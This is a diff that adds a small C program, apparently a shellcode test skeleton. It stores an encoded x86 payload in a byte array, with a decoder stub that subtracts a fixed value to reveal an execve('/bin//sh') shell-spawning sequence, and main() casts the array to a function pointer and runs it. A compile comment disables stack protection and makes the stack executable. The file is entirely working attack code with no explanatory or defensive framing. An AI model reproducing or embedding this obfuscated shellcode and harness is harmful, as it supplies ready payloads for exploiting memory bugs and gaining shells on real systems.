@@ -1,0 +1,15 @@
+// compile with
+// gcc -fno-stack-protector -z execstack _shellskeleton.c shellskeleton
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code [] = "\xeb\x11\x5e\x31\xc9\xb1\x19\x80\x2e\x0d\xeb\x02\x31\xc0\x46\xe2\xf6\xeb\x05\xe8\xea\xff\xff\xff\x3e\xcd\x5d\x75\x3c\x3c\x80\x75\x75\x3c\x6f\x76\x7b\x96\xf0\x5d\x96\xef\x60\x96\xee\xbd\x18\xda\x8d";
+
+
+main()
+{
+    printf("Shellcode Lenth: %d\n", strlen(code));
+    int (*ret)() = (int(*)())code;
+    ret();
+}
